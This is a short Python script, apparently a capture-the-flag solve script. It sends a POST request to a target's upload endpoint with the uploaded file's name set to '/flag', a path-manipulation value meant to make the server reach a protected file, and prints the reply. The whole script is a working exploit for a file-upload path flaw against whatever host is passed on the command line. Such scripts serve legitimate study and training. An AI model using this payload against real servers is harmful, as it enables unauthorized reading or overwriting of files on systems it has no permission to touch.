#!/usr/bin/python3.8
import requests
import sys


if len(sys.argv) < 2:
    print("Usage: solve.py http://host:port/")
    exit()


URL = sys.argv[1]
r = requests.post(URL + "upload", files={"file": ("/flag", "aa")})
print(r.text)
